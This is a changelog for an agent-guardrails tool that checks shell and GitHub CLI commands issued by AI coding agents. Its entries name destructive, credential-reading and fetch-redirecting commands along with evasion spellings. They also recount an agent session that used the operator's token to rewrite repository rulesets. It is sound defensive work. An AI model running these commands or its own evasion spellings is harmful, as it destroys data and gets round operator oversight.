# Changelog

All notable changes to agent-guardrails. Format: one section per release;
within a release, grouped by theme. Breaking changes are called out
explicitly in **Breaking** notes.

## v0.20.27-dev
- **Feature (#236): doctor reports credential posture, and the docs say how to
  narrow it.** guardrail and the agent share a trust domain, so every rule is
  something the agent runs *inside*. The strongest control is the one it cannot
  reach: the credential simply lacks the authority. guardrail cannot grant that
  -- only the operator can, at the provider -- so what it does is notice when
  the ambient credential is wider than the work needs, and say where to read
  about narrowing it.
  `docs/operator-hardening.md` is the setup: a fine-grained token scoped to
  selected repositories with Contents/PRs/Issues read-write and no
  Administration, Secrets or Workflows; one identity per machine context; hard
  caps at the biller, which is the only control on the page that bounds a
  runaway loop rather than a single decision; and the server-side invariants a
  reduced token cannot undo. It states the limit plainly, because it is easy to
  assume otherwise: guardrail protects secrets from being *read*, and does not
  by itself stop ambient authority from being *used*.
  `guardrail doctor` adds a `credential posture:` section -- advisory, never a
  failure. It warns on administration-shaped gh scopes (`admin:*`,
  `delete_repo`, `workflow`, `write:org`, `site_admin`), on more than one gh
  account being logged in, and on a kubectl context that is not known-local,
  reusing the Engine's own list so the two cannot disagree about what local
  means. Credential variables are reported **by name**, because a token in the
  environment overrides the stored login and the posture just printed may not
  be the one that applies.
  It learns all of this without reading or printing credential material: scope
  names, account counts and variable names only, and the input type has no
  field that can hold a secret. `repo` is deliberately not warned about --
  nearly every working login carries it, and a warning everyone sees every time
  is how an operator learns to click through the ones that matter. Cloud
  credentials are reported as present but explicitly **not** judged for
  privilege: establishing that needs a provider call doctor does not make, and
  a check that guessed would hand out false assurance. Silence in this section
  means *not known*, never *fine*.
- **Fix (#228): the `gh` porcelain is classified, so the Engine is no longer
  weaker than its own backstop.** `gh api -X DELETE repos/o/r/rulesets/1`
  asked; `gh repo delete o/r --yes` was allowed. Measured on `772392d`, the
  *entire* porcelain surface was allow -- `gh secret set`, `gh secret delete`,
  `gh repo edit`, `gh repo archive`, `gh pr merge`, `gh release create|delete`,
  `gh workflow run`, `gh auth refresh -s admin:org` -- while the api spelling
  of the same endpoints asked. The porcelain is the easier spelling, so the
  gate covered only the form an agent reaches for second.
  Two things made that worse than an ordinary gap. The declarative floor
  (ADR-0022) already denies `gh repo delete` and asks on `gh secret set`,
  `gh pr merge`, `gh release create` and `gh workflow run` -- and the floor
  exists for when the Engine is *unreachable*, so the backstop being stricter
  than the primary gate is backwards. And the floor is Claude's settings file,
  so on codex, opencode and antigravity the porcelain was ungated outright and
  reached the audit log as an allow with no rule attribution.
  Rule ids are per family, following #235, so an operator running a release
  loop does not have to waive secret administration to do it:
  `P2.gh-repo-delete` (the one deny, matching the floor -- deleting the
  repository is not a setting that can be changed back), `P2.gh-protection`
  (secrets, variables, `repo edit`, rulesets -- shared with the api rule, since
  one risk deserves one rule id whichever spelling reaches it),
  `P2.gh-repo-admin` (archive, rename, transfer), `P2.gh-auth-scope`,
  `P2.gh-pr-merge`, `P2.gh-workflow-dispatch`, and `P6.publish` for releases,
  reusing the existing publish family rather than inventing a gh-shaped twin.
  Scope escalation keys on the flag rather than the verb: `gh auth refresh -s
  admin:org` asks, plain `gh auth refresh` does not, because re-authorizing the
  scopes a token already has is not widening them and asking for it would train
  the operator to click through the ones that do.
  Reads stay allow throughout and are the larger half of the test set --
  `gh secret list`, `gh release view`, `gh pr checks`, `gh workflow list`,
  `gh ruleset view`, `gh auth status`. `gh` is how the fleet checks CI, and
  prompting on every view is how an operator learns to click through the
  prompts that matter.
  **The env-prefix half of #228 needed no code.** Measured first, as directed:
  the NF-5b/NF-19 shell-state machinery already strips assignment prefixes
  before any rule sees the command, so `NPM_TOKEN=… npm publish` already asked
  and `GH_TOKEN=… rm -rf /etc` already denied. `GH_TOKEN=… gh repo delete` was
  allowed because `gh repo delete` was allowed, with or without a prefix. The
  full taxonomy -- single, multiple, inline `env`, `env -i`, absolute
  `/usr/bin/env`, and `export` chains -- is pinned as tests so a credential
  prefix cannot become a way to spell past a rule that now fires.
- **Feature (#173): the operator can authorize one exact command instead of
  losing the action to an out-of-band run.** An Ask that chat cannot clear had
  one endgame: the operator ran the action outside guardrail, which made the
  single most consequential command in the session the only one with no audit
  record. `guardrail approvals grant` converts that into an in-policy,
  attributed allow.
  A grant is a relaxation of the same kind the overnight one is, with a smaller
  blast radius, so it inherits the same limits. ADR-0018's exclusions
  (`capability-external`, `capability-web-search`, `unknown-native-tool`) and
  the three fail-closed backstops can never be granted, and the exclusion list
  is now literally one list that both mechanisms read rather than two copies
  that drift. Enforcement runs at issuance, which refuses with the reason, and
  again at match time, so an entry written by hand or left behind by an older
  binary still cannot relax outward reach.
  There is no pattern language, and that is a decision rather than an omission.
  Matching semantics have been this codebase's most reliable source of silent
  failure -- `gh repo delete*` matched nothing, 23 floor globs were judged
  against the wrong matcher, and the production and test matchers disagree --
  and every one of those failed closed. A grant pattern fails the other way,
  and the agent is the party that asks the operator to issue one. So a grant
  keys on the exact `(repo, rule ID, command)` triple, compared literally with
  no trimming or normalization: `git push origin HEAD:main` is not covered by a
  grant for `git push origin main`, though both push the same branch and raise
  the same rule.
  One use by default, not just a window. Every case in the filing needed
  exactly one successful pass, while a 30-minute window authorizes an unbounded
  number of them. `--uses N` raises it explicitly, `--for` defaults to 30
  minutes and is clamped to 24 hours, and the use is spent under the operator
  lock before the verdict changes so two concurrent calls cannot both spend
  one. An absent or zero count is spent rather than unlimited, because
  consumption writes the count back and reading absent as available would renew
  a spent grant on every load.
  The ceremony's job is that the operator can verify what they are authorizing
  by reading it, so the command is shown whole and then again quoted, which
  makes tabs, trailing spaces and other invisible characters visible. Nothing
  is truncated and no summary stands in for the string that will be matched.
  Issuance is refused to anything but an interactive operator terminal.
  Both ends are audited. Issuance and revocation write an operator record, and
  a consuming allow is recorded under `ask-allowed-by-operator-grant` carrying
  the original rule as its origin, so a grant makes an action louder in the
  record rather than quieter. If that record cannot be written the allow is
  withdrawn and the rule stays enforced.
  `guardrail approvals revoke` is included rather than deferred: without it an
  operator who realises a grant was too broad has no move except waiting out
  the window, and "wait 29 minutes" is the kind of gap that gets solved by
  editing the config by hand. `guardrail approvals list --grants` prints what
  is authorized, in full.
  A policy Ask now also names this path (#129's sentence, extended). It still
  rules out the wrong turns agents actually took, but no longer claims no
  machinery exists for rules where a grant does -- while telling the agent to
  ask for the command it ran and never a broader form, since composing the
  request is exactly where an agent could widen it.
- **Fix (#255): a POSIX path is no longer read as a Win32 one, so `rm -rf /`
  denies on Windows.** A Bash command's path tokens are POSIX; `ToolCall.CWD`
  and `RepoRoot` are host paths. `authorizedPath` judged the first against the
  second with `filepath`, which on Windows reads `/etc` as *relative*:
  measured, `filepath.IsAbs("/etc")` is false and `filepath.Join(C:\repo,
  "/etc")` is `C:\repo\etc`. Every POSIX absolute path silently became
  repo-relative, landed inside the repository, and was authorized. `/` became
  the repo itself, which is why bare `rm -rf /` -- no wrapper, no redirect, no
  container -- read as a delete of the working tree's own root and allowed.
  Not a missing rule: the containment logic was correct and was being handed a
  path that had already been mistranslated. The fix is the translation ADR-0023
  built the primitives for and applied at two seams by hand -- `posixIsAbs`,
  `posixDriveToWin32` -- applied where paths are actually judged. A candidate
  now records the dialect it was written in at the point it is extracted,
  never inferred from the string's shape, because `/etc` is also a legal Win32
  relative path; it is translated once, explicitly, before any `filepath` call.
  `/c/repo/x` maps to `C:\repo\x` and ordinary Git Bash work is untouched.
  `/tmp` maps to the host temp root, which is the whole of its handling: the
  System temp write seam then applies to it unchanged, so descendants stay an
  authorized write target while the root itself and escapes out of it
  (`/tmp/../etc`) are protected by the containment that already guards
  `os.TempDir()`. An absolute POSIX path this host cannot address -- `/`,
  `/etc`, `/dev/null/child` -- is reported as such rather than guessed at,
  which routes it to the rule that owns its risk. No fstab reading and no shell
  probing: that is environment simulation, which ADR-0012 rejects, and it would
  make a verdict depend on state that can change between check and execution.
  The translation reconciles two dialects, so it applies only when there are
  two. A repo root that is itself an unaddressable POSIX path means the whole
  evaluation is in POSIX coordinates, and folding one side of that would be the
  same mistranslation in the other direction; `TestTranslationAppliesOnlyToAMixedFrame`
  pins that boundary rather than leaving it to be discovered. On Linux and
  macOS the host dialect is POSIX and the translation is the identity by
  construction, which is how the platforms stay in step without a GOOS branch
  in any rule.
  Measured on Windows against the merge base: 29 adversarial nodes close,
  including `TestHostileOverlayCannotLoosen/recursive_etc_delete` and every
  `*_recursive_root_delete` wrapper family, with zero new failures; the engine
  package drops 3 more. No fixture was rewritten into Win32 spellings -- the
  POSIX forms are reachable through Git Bash, so rewriting them would delete
  the coverage rather than fix it.
- **Fix (#235): credentialed CLIs are classified before they publish, deploy or
  bill.** `npm publish`, `docker push`, `kubectl apply`, `terraform apply`,
  `vercel --prod` and their families act with authority the agent never reads --
  the token lives in a keychain, a kubeconfig, or an inherited environment --
  and none of them touch the working tree, so nothing else in the Engine saw
  them. Same projection shape as the PowerShell and cmd.exe work: classify the
  subcommand, hand the verdict to the family that owns the risk.
  Rule ids are per family (`P6.publish`, `P6.cluster-mutate`, `P6.cloud-mutate`,
  `P6.deploy`) rather than one blob, so an operator running a Kubernetes dev
  loop does not have to waive `npm publish` to do it, and so the per-rule
  verdict profile stays readable.
  Reads stay allow throughout, and the read twins are the larger half of the
  test set: `kubectl get`, `aws ec2 describe-instances`, `docker pull`,
  `terraform plan`, `helm list`, `npm view`. Those are how somebody inspects
  the system they are about to change, and gating them is how an operator
  learns to click through the prompts that matter. `--dry-run` stays allow for
  the same reason: the CLI guarantees no side effect, so the gate has nothing
  to protect. A local Kubernetes context (`kind-…`, `minikube`,
  `docker-desktop`, `k3d-…`, `rancher-desktop`) stays allow; an unstated
  context asks, because the safe reading of "I cannot tell which cluster" is
  not "it is fine".
  Cloud CLIs use a read allowlist rather than a mutation list -- enumerating
  every mutating operation across aws, gcloud and az is not tractable, and
  unknown-means-ask is the direction a billing mistake should fail in.
- **Fix (#129): an Ask now says which approval path applies.** Deny verdicts
  already carried a per-rule continuation; Ask verdicts had one generic
  sentence for every rule, and "request authorization" reads to a model as
  "find the technical approval mechanism". Recorded consequences: a
  `P5.ci-infra-lockfile` ask sent an agent hunting for a URL and reporting
  "no approval path", and a `P2.git-push-delete` ask sent another to
  `guardrail approvals list`. Both should have said one sentence to the
  operator and retried.
  A policy ask now states that there is no approval URL, no daemon and no
  `guardrail approvals` command for it -- naming the wrong turns, because the
  failure was agents looking for machinery that does not exist rather than
  agents missing an instruction. A broker ask surfaces its approval URL and
  says chat will not clear it.
  The path is chosen from the broker state the verdict already carries, not
  from a list of rule names: a rule list would silently misroute every rule
  added after it was written. The existing Ask sentences are unchanged --
  four plane tests pin them -- and the path sentence is added to them.
- **Fix (#251): the go toolchain is classified per subcommand.** It reached the
  analyzer as unknown words, so every subcommand was judged alike: not at all.
  The cut is *whose code*, not whether code executes. `go test` runs module
  code exactly the way `go run` does -- init(), TestMain, every test body -- so
  an execution/no-execution line between them does not describe the risk.
  Running the repository's own packages is not something a static tool-call
  guard can contain (ADR-0012: the agent authored them and can reach them
  through Bash a hundred other ways), and `go build`, `go test` and
  `go run ./cmd/x` are the most frequent commands a Go developer types, so
  gating them would be friction with no containment gain.
  What is gated: `go run <remote>` -- a target carrying an `@version` or a
  domain-shaped first path segment -- asks as the one-step fetch-and-execute,
  the same class as the `go get`/`go install` ask that already existed;
  `go mod download` asks as a network fetch; `go env -w GOPROXY=…` and the
  other fetcher levers (GOFLAGS, GONOSUMDB, GONOSUMCHECK, GOSUMDB, GOINSECURE,
  GOPRIVATE) deny, the direct analogue of the `npm --registry` and
  `pip --index-url` denies that were already there; `go mod edit -replace`
  denies as a redirect to an arbitrary path, while any other `go mod edit`
  asks, closing the gap between writing go.mod with a tool and writing it with
  a command; and `-toolexec`/`-vettool` ask wherever they appear, because they
  run an arbitrary program for every compile step.
  **The inline form of the redirect needed the tokenizer.** `GOPROXY=https://evil
  go get x` and `go get x` produce identical argv -- the shell assignment
  prefix never reaches a rule -- so the per-invocation lever, which leaves no
  persistent trace and is the likelier shape, was invisible. Simple now carries
  the Go fetcher variables the same way it already carried GIT_DIR, and the
  capture reuses that mechanism rather than inventing one.
- **The floor now mediates the `gh` porcelain that reaches the same endpoints
  the parser watches.** #252 taught the Engine to read `gh api`'s HTTP method,
  but the porcelain subcommands reach those endpoints with no method flag to
  parse: `gh secret set` is a PUT to `actions/secrets`, `gh repo edit
  --visibility` a PATCH on the repo. Those are shape-level, which is what a
  floor glob can match, so they belong on the floor rather than in the parser.
  Asking now: secrets and variables (`set` and `delete` both -- an ask on one
  verb is evadable by reaching for the other, and breaking CI by removing a
  token is the same authority as handing CI a token); repository acts under the
  operator's admin authority (`repo edit|archive|rename|transfer`, alongside
  the existing `repo delete` deny); the credential family (`auth
  switch|login|refresh|logout`, `ssh-key add`, `gpg-key add`), which mutates no
  repository at all but changes *who the agent is* -- a second logged-in
  account is one command away; and `release edit|upload`, the companion to the
  existing `release create|delete`.
  Reads and lists stay allow throughout. Each read in the test set shares a
  prefix with a mutation above -- `gh secret list` against `gh secret set`,
  `gh auth status` against `gh auth switch` -- so a glob one character too
  greedy shows up as a failure rather than as noise in someone's session.
  Deliberately left out, and named so the omission is a decision rather than an
  oversight: `gh pr close`, `gh issue close|delete`, `gh run rerun|cancel`,
  `gh codespace create`, `gh gist create --public`. All outward-facing, none
  authority-changing or irreversible, and #228 itself marks them as candidates
  rather than settled.
  The #249 guard did its job on the way in: all 16 new globs failed the build
  until each was paired with the command it exists to stop, and the
  known-broken list stayed at 23 -- no new breakage introduced.
- **Fix (#228): rewriting a GitHub protection through `gh api` now asks.** An
  agent running under the operator's `gh` login holds the operator's full
  repo-admin authority, and every GitHub-side protection is editable by that
  same token -- so the protections do not bind the agent, which can remove a
  protection and then do the thing it blocked. #228 records this happening: a
  session rewrote this repository's `main` ruleset bypass actors, created a tag
  ruleset, changed the Actions permissions policy and enabled immutable
  releases, all through plain `gh api`, all evaluated as ordinary commands.
  All six of those calls, and their inverses that remove the protections,
  now ask.
  The floor's glob pair (#232) could not reach this and the gap was documented
  there: the method lives in a flag, the endpoint carries slashes, and a glob
  does not cross a separator -- measured, the method-aware globs caught 2 of 6
  mutating spellings while the only shape catching all six also matched every
  read. The Engine parses the method instead, which is the point of having a
  precise layer. `gh api` defaults to GET, an explicit `-X`/`--method` wins,
  and a body flag (`-f`, `-F`, `--field`, `--raw-field`, `--input`) implies a
  POST with no method flag present anywhere in the command -- the inference a
  glob cannot make, pinned by its own test.
  **Reads stay allow**, including an explicit `-X GET`, `--paginate` and
  `--jq`: auditing these endpoints is routine, and a rule that prompts on
  inspection is how an operator learns to stop reading the prompts. Ordinary
  mutations stay allow too -- posting an issue comment is not an admin act.
  Path spellings do not evade it: a leading slash, a full `https://api.github.com`
  URL, `--hostname` for GHES and mixed case all normalise to one comparison. A
  `gh api graphql` call whose query text contains `mutation` asks, which is
  #228's stated minimum bar for the transport that can perform the same
  mutations behind a path that says nothing.
  Deliberately an ask and not a deny, per #228's non-goals: the operator may
  change their own settings, they just have to be the one deciding. The
  porcelain families (`gh secret set`, `gh repo edit`, `gh auth switch`,
  env-prefixed tokens) and the other transports (`curl` to `api.github.com`)
  are the rest of #228 and are not handled here.
- **`guardrail audit --verdicts`: what the guard decided, not just that it
  ran.** The evidence gate answers "is the guard present" -- it counts records
  and looks for two pre-hook records in one real session. A guard that runs and
  allows everything passes it identically to one that is working. The new view
  reads the same log by rule: deny/ask/allow counts, how many distinct sessions
  each rule fired in, and the worst single session, over the deployed binary's
  mtime window. No schema change; `decision`, `rule_id` and `session_id` were
  already there.
- **Ask pressure, and an honest statement of what it is not.** The metric
  asked for was the ratio of asks answered yes without reading. That is not
  computable from this log and no amount of querying makes it so: guardrail
  never learns how a prompt was answered, because the hook returns `ask`, the
  human answers inside the plane, and no record comes back -- there is no
  second event to time or to read an outcome from, and no call-correlation id
  to join on. Measured on real data: 434 `post` records against 23,677 `pre`.
  So the output reports concentration instead -- how often one rule interrupts
  one session -- and says in the output, not just in a commit message, that it
  cannot see how the asks were answered. On this machine's log it immediately
  found a session asked **119 times by `P3.unresolved`** and another **304
  times by `capability-external`**, which is the shape that turns a gate into
  a formality.
- **"No audit log" no longer reads as "nothing was decided."** Those are
  different answers and the second one is reassuring, so an absent log now
  fails loudly instead of rendering as an empty profile.
- **The floor generator now proves each glob matches the command it exists to
  stop.** A glob that matches nothing is worse than a missing one: it reads
  correct in review, appears in the golden file, and stops nothing. #232 found
  the first instance -- `gh repo delete*` does not match
  `gh repo delete owner/repo`, because `*` does not cross a path separator and
  a pattern containing no slash cannot match a subject that does. Every deny
  and ask glob is now paired with its canonical dangerous command, and a glob
  that does not match its own example fails the build. Adding a glob without an
  example fails too, so the pairing cannot rot, and a known-broken entry that
  starts matching fails until it is removed from the exemption list.
  Scope is the deny and ask lists on purpose: an allow glob matching nothing
  merely fails to grant an exemption, which is fail-closed, while a deny or ask
  glob matching nothing is fail-open.
  **The guard immediately found 23 more (#244)**, including `sudo *`, `dd *`,
  `mkfs*`, `shred *`, `wipefs *`, `chmod 777 *` and guardrail's own
  `rm *guardrail/sessions/*`. They are recorded as known-broken with the issue
  attached rather than rewritten here, because the right replacement depends on
  the production matchers' real semantics, which cannot be established from
  inside this repo -- and a rewrite tuned to the wrong model would be worse
  than the list, because it would look fixed. Shrinking that list is the fix;
  the guard stops a 24th.
- **The declarative floor now mediates the GitHub CLI.** `gh` is a shell
  command that mutates state nothing in the working tree reflects: it merges
  pull requests, cuts and deletes releases, dispatches workflows and deletes
  repositories. None of that was on the floor, so with the Engine unreachable
  (ADR-0022) those ran unmediated. `gh pr merge`, `gh release create|delete`
  and `gh workflow run` now ask; `gh repo delete` denies. Reads stay allow --
  `gh` is how the fleet checks CI, and prompting on every `gh pr view` trains
  people to click through the prompts that matter. Both planes inherit the
  entries from one source, because OpenCode rewrites the same two glob
  functions Claude reads.
  **The glob shape is load-bearing.** `*` does not cross a path separator in
  the permission matcher, so the obvious `gh repo delete*` silently fails to
  match `gh repo delete owner/repo` -- the single most likely spelling of the
  command it exists to stop. Measured before it shipped rather than after; the
  brace alternation `{,**}` matches the bare subcommand and any slash-bearing
  argument, and a test fails if a bare trailing star reappears.
  **`gh api` is only partly covered, and the limit is stated rather than
  papered over.** The method lives in a flag, the endpoint carries slashes, and
  no glob that catches `gh api repos/o/r -X POST` fails to also catch every
  read: measured, the method-aware shapes reach 2 of 6 mutating spellings at
  zero false positives, while the only shape reaching 6 of 6 also matches every
  `gh api` view. So the floor asks for a method flag written *before* the
  endpoint and leaves the rest to the Engine (#228), instead of claiming a
  coverage it does not have.
- **Fix (#218): publishing a tag now asks.** The floor and the Engine asked for
  `git push --tags`, `git push * main` and a deletion refspec, but a *named*
  tag push matched none of them: `git push origin v0.21.8-dev` allowed, and a
  premature release pointer went public from a guarded session. The cascade is
  the reason this matters — CI built release assets from the tagged tree, the
  asset was deployed, and cleanup was then blocked, because tag-deletion
  rulesets correctly refuse `git push origin :refs/tags/…` (`GH013`). The gate
  held at deletion and missed at creation, so the wrong pointer was stranded
  until an admin deleted it by hand.
  The Engine now classifies the push *destination*. A destination under
  `refs/tags/` is unambiguous — it says what it is in the command text — so it
  asks exactly, with no false positive to trade away; that case allowed before
  and was the larger hole, since `git push origin HEAD:refs/tags/v1.0.0` states
  its intent plainly and still sailed through.
  A bare destination is genuinely ambiguous: `git push origin v0.21.8-dev` and
  `git push origin some-branch` are the same command shape, and which one it is
  depends on what exists in the repository. The Engine cannot find out — it is
  a pure function of the call it is handed, it never execs and never reads the
  repo — so a version-shaped name is classified on its own shape and the error
  is taken on the asking side. **A branch named `v2.0.0` therefore also asks**,
  which is pinned by a test named for the trade rather than left to be
  discovered. Resolving the name properly would mean running `git rev-parse`
  from a rule that runs on every tool call: a subprocess on the hot path, a
  verdict that depends on state which can change between check and push, and
  the end of "the same call always produces the same verdict".
  The floor gains `git push * v[0-9]*` as an ADR-0022 backstop for when the
  Engine is unreachable, crude by construction since a glob cannot tell a tag
  from a branch. `docs/OPERATIONS.md` gains the tag lifecycle: creation asks,
  deletion is ruleset-blocked, the admin UI is the only retraction path — and
  therefore to check what the tag points at before answering the prompt.
- **One place names the executable suffix, and a guard keeps it that way.**
  Closing out the caution filed with #198: three test files had each
  open-coded `if runtime.GOOS == "windows" { name += ".exe" }` for a helper
  binary they build and then run. The hazard itself is gone repo-wide — a full
  Windows suite now reports zero `executable file not found in %PATH%`, the
  signature of the defect #198 described — so this is consistency rather than
  correctness. It still matters, because the failure mode is neither a compile
  error nor an obviously wrong assertion: a fourth hand-rolled copy works on
  its author's machine and silently misbehaves on the other platform, which is
  exactly how the adversarial corpus went unrun on Windows for so long. All
  three now call `testenv.ExecutableName`, and
  `TestNoTestRollsItsOwnExecutableSuffix` fails if a new copy appears.
  One documented exemption: `update_test.go` asserts the *release asset* name
  the updater downloads, which is part of the published artifact contract
  rather than the host's executable-naming rule.
- **Fix (#174 family K): the output-sanitization fixtures now run on Windows.**
  Tests that assert guardrail neutralizes hostile bytes in its own reports
  build real files whose names carry newlines, tabs and escapes, so a path can
  try to forge an extra status line. Windows cannot create those names, so the
  fixtures failed at `os.Mkdir` long before reaching the assertion and the
  sanitizer went unexercised on the platform whose console rendering differs
  most. Measured on NTFS: `\n`, `\r`, `\t` and ESC are rejected outright, and
  so are the reserved `: < > " | ? *`; `\x7f`, the C1 controls, U+2028, U+2029,
  U+0085 and U+00A0 are all accepted. `testenv.HostilePathSegment` adapts a
  segment to what the host will accept without softening it: the hostile
  characters map to hostile substitutes the sanitizer must still neutralize
  (`\n` to U+2028, ESC to U+009B, which *is* the C1 control sequence
  introducer), and the reserved punctuation maps to inert look-alikes that were
  never the subject. POSIX keeps the canonical bytes, and a path that is never
  created keeps them on every host — there is no filesystem constraint to work
  around, and substituting there would weaken the test. Gating these off on
  Windows would have been the cheaper fix and the wrong one: the property is
  that the *product* neutralizes hostile output, which does not require those
  bytes to survive a round trip through the filesystem.
- **A Windows-reachable sanitizer path is now pinned.** `safetext.SingleLine`
  neutralizes U+2028/U+2029 through its `strings.Fields` join rather than its
  `unicode.IsControl` branch, because those are category Zl/Zp and not Cc. That
  distinction is load-bearing on Windows and nowhere else: `\n` cannot appear
  in an NTFS filename but U+2028 can, so the line-forging attack is reachable
  there *only* through the separators the control branch misses. A refactor
  dropping the join would have reopened it with every C0/C1 test still green.
- **Fix (#191): the approval client now authenticates the pipe server.**
  ADR-0021 promises the OS authenticates the peer, and the owner-only DACL
  delivered that in one direction only: no other user can connect to our pipe,
  but the client never checked who owned the pipe it dialled. On Windows
  `\\.\pipe\` is a flat, world-creatable namespace — the DACL protects the
  object once created but does not reserve the name — so any local process
  could hold the broker's name first and answer in our place. Measured before
  the fix: the client connected to a squatter and a forged
  `status: "approved"` reached the caller's reply struct. `dialPrivate` now
  asks the OS which executable serves the other end
  (`GetNamedPipeServerProcessId` → `QueryFullProcessImageName`) and refuses
  anything that is not this binary, which is the right comparand because the
  daemon is spawned as `os.Args[0] approvals daemon`. The liveness probe uses
  the same answer, so a squatted name is now a named `ErrForeignServer` failure
  instead of being misreported as "approval daemon is already running" — the
  operator could not previously tell an impersonator from their own daemon.
  Image paths are resolved before a mismatch is believed, since the same
  executable has a case-insensitive and an 8.3 spelling and a false mismatch
  would refuse our own daemon.
  **Deliberately not closed, and unchanged by this fix:** a process running as
  the same user can copy the binary and pass the check. That cell is open on
  Unix too — a same-user process can bind the socket path first there, measured
  and recorded on #191 — and it is the cell guardrail's own threat model lives
  in, so it wants an operator decision rather than a check here.
  FILE_FLAG_FIRST_PIPE_INSTANCE was the intended listen-side mechanism but
  go-winio does not expose it; measurement showed a second `ListenPipe` over a
  held name is refused anyway, so the defect was never silent acceptance but
  the misdiagnosis, which is what changed. The probe-to-create window remains
  open and is documented at the call site.
- **Fix (#198): the adversarial corpus now actually runs on Windows.** The
  harness built its probe binary as `guardrail` on every platform. Go does not
  append the executable suffix when `-o` names a file, and Windows resolves
  executables through PATHEXT, so the build produced a file that existed and
  could not be started. Every case failed with `executable file not found in
  %PATH%` quoting an absolute path that was right there on disk, which reads as
  an environment fault rather than a missing suffix — and the 322-case hostile
  corpus had therefore never executed on Windows at all, in CI or locally. A
  second defect was hiding behind it: the harness passed `XDG_STATE_HOME` to
  the spawned binary but not `LOCALAPPDATA`, so the child wrote its audit log
  into the operator's real profile while the assertion read an empty temp
  directory. Both suffix and root handling now come from `internal/testenv`
  (`ExecutableName`, `ChildRootEnv`) rather than a local convention, which is
  the shared helper #174 group D wants across the four packages with this
  shape. `ExecutableName` is idempotent, because `guardrail.exe.exe` is a
  different filename Windows will not run (measured in #178).
  Result: **322 cases execute and 286 pass**, the first real Windows judgement
  of the hostile spellings. The remaining 36 are *not* guardrail gaps — every
  one traces to a corpus fixture whose paths are POSIX-absolute (`cwd: /repo`,
  targets like `/etc` and `/`), which Windows reads as repo-relative, so a
  delete that should land outside the repo lands inside it and is correctly
  allowed. That is #174 group B fixture work and is deliberately not attempted
  here: rewriting a 322-case security corpus alongside a harness fix is how a
  verdict assertion gets quietly weakened. The package stays out of the Windows
  CI job only because those POSIX-shaped fixtures still carry different path
  semantics on Windows.
- **Fix (#199): the browser loopback test no longer hangs the approval
  package.** `TestBrowserLoopbackFailurePath` drives a real browser through the
  `agent-browser` CLI, and none of its four steps was bounded. `CombinedOutput`
  waits for the output pipes to close rather than for the process to exit, and
  `agent-browser open` launches a browser that inherits those handles and keeps
  running — so the wait never ended. The package died on the default
  ten-minute test timeout with a goroutine dump instead of a named failure,
  which is the single largest contributor to Windows full-suite runtime and the
  reason a full run reads as hung. It also masked 30 entries in the #174
  inventory: those were a timed-out package, not 30 portability defects.
  Output now goes to a file rather than a pipe — a file handle is inherited
  just as happily and has nothing to wait on — with a per-step deadline and a
  `WaitDelay` behind it so no route outlives the timeout. The test **passes in
  about three seconds on Windows**, where it had never passed at all, and the
  whole `internal/approval` package now completes in seven.
  The test was also *green where watched and destructive where not*: no CI
  runner has `agent-browser`, so it skipped everywhere it was observed and hung
  only on developer machines. Both skips now say what they leave uncovered, and
  "the CLI is installed but no browser is" — the Linux case, which previously
  failed — is reported as the missing precondition it is rather than as a
  defect.
- **Fix (#139): cmd.exe destructive builtins are now judged.** cmd spells its
  switches with a forward slash, so `del /s /q <dir>` reached the rules as an
  unrecognised command with three path operands and P1 never saw a recursive
  delete; `rd /s /q C:\Windows\System32` allowed. Worse, `cmd /c "<command>"`
  was not unwrapped the way `sh -c` already was, so the wrapper laundered every
  verdict a plane could otherwise trip: `sh -c "rm -rf X"` denied while
  `cmd /c "rm -rf X"` allowed. The cmd builtins are now projected onto the
  POSIX command they stand for and handed to the rule that already owns it, so
  `rm -rf`, `Remove-Item -Recurse` and `del /s` share one containment decision
  and one waiver, and `cmd /c` / `cmd /k` unwrap alongside the POSIX shells.
  `format` and `diskpart` join `P1.mkfs`. Semantics were measured on disposable
  trees rather than assumed, and two measurements narrowed the rule: `rd <dir>`
  without `/s` fails on a non-empty directory, so it keeps the existing
  `P1.rmdir` ask instead of being read as a tree delete, and cmd rejects dash
  switches outright, so `del -s -q` is not a shape to model. Switch names are
  enumerated per command rather than accepting any `/token`, because a leading
  slash is an absolute path on POSIX — reading `/etc` as an unknown switch
  would have consumed the operand and left the delete with nothing to judge.
  A `format` call counts only with a drive-letter operand or one of format's
  own switches, so a POSIX code formatter of the same name is untouched.
- **doctor's unquoted-space detection is structural, not a guess.** It asked
  whether the token after the first space carried a separator, which read
  `/home/u/my file hook claude` as safe — a gap #155 shipped with, named at
  review. `UnquotedShellHazard` only ever sees guardrail's own floor commands,
  and those have a known shape (`<binary> hook <plane> …`), so the question is
  no longer the unanswerable "is `a b` one path or a command and an argument"
  but "is `hook` the word right after the executable". Two boundaries stay
  deliberate and are pinned by tests: a command with no `hook` word falls back
  to the older signal rather than inventing a hazard, and a path whose final
  component is literally `hook` is known residue.
- **Fix (#178): a trailing dot or space no longer hides a command from its
  rule.** Win32 strips both while resolving a path, so a binary spelled with
  either still runs, while `head()` stripped one `.exe` and nothing else,
  compared the remaining name, matched nothing, and allowed. Every family keyed
  on a command name was affected: `P1.rm-rf`, `P1.privesc`, `P1.mkfs`,
  `P6.egress`, and `P5.self-config`, the last of which let a plane turn off its
  own night mode. The trim is applied only where Win32 resolution applies — a
  drive-lettered or backslash path anywhere, or any path on a Windows host — so
  a POSIX file legitimately named `rm.` is still judged as itself. Deliberately
  *not* denied, because they do not execute: a bare `rm.` or `Remove-Item.`
  (PATH and cmdlet lookup do not strip), and `rm.exe.exe` (a different
  filename). Operand-keyed families were never affected.
- **PowerShell `$env:NAME` no longer forces an ask on an ordinary read.** The
  bash tokenizer splits the reference at the wrong place — `$env` is an unset
  variable to it and everything after is literal — so every read through one
  asked, however ordinary. The Engine still does not learn what the variable
  holds (ADR-0012 rules out simulating an environment); it stops raising
  `P3.unresolved` for the prefix alone and lets the path families judge the
  literal tail. `$env:USERPROFILE\.ssh\id_ed25519` still denies
  `P4.secret-path`, a write or delete through `$env:` keeps its ask because
  containment needs the root the variable withholds, and a redirect is never
  forgiven. A read now reaches the same verdict as the literal path it stands
  for, which it did not before.
- **CI's windows job can no longer hide a Windows test.** That job runs a fixed
  package list filtered by `-run 'Windows|BOM|ReadJSONObject'`, not the full
  suite, so a Windows test is invisible there unless its name matches *and* its
  package is listed. Both halves had been missed: eight PowerShell tests for
  #111 would have run only on ubuntu and macos until they were renamed, and
  `internal/policy` has carried two Windows-named tests the job never ran.
  Two guards now read `ci.yml` itself — so they cannot drift from what CI does
  — and assert that every Windows-named test file contributes a selected test,
  and that every selected test lives in a package the job runs.
  The guards respect build constraints, and a package deliberately outside
  the job is exempted with a written reason rather than silently skipped —
